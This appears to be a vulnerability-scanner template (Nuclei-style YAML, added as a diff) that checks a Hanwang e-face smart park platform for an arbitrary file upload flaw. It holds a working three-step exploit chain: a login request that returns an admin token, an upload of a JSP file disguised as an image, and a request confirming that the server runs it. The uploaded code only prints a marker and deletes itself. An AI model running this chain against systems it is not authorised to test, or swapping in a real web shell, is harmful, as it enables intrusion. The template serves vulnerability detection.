@@ -1,0 +1,83 @@
+id: poc-yaml-hw-e-face-pass-spmp-mobimeetingapp-anyfile-upload
+info:
+  name: 汉王e脸通智慧园区管理平台 mobiMeetingApp 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(5)}}"
+  t2: "{{base64(t1)}}"
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - id: get-token
+    method: POST
+    path:
+      - '{{BaseURL}}/manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"userName":"admin"'
+      - type: regex
+        part: body
+        regex:
+          - '"password":"([0-9a-z]+)"'
+    extractors:
+      - type: regex
+        name: token
+        part: body
+        internal: true
+        regex:
+          - '"token":"(?P<token>.*?)",'
+
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/manage/mobiMeetingApp/uploadMeetingFile.do'
+    headers:
+      token: '{{token}}'
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+    body: |-
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
+      Content-Type: image/jpeg
+
+      <% out.print("{{t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '.jsp'
+    extractors:
+      - type: regex
+        name: file
+        part: body
+        internal: true
+        regex:
+          - '"path":"(?P<file>[0-9a-z]+).jsp'
+
+  - id: verify-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/manage/resource/{{file}}.jsp'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{t2}}'
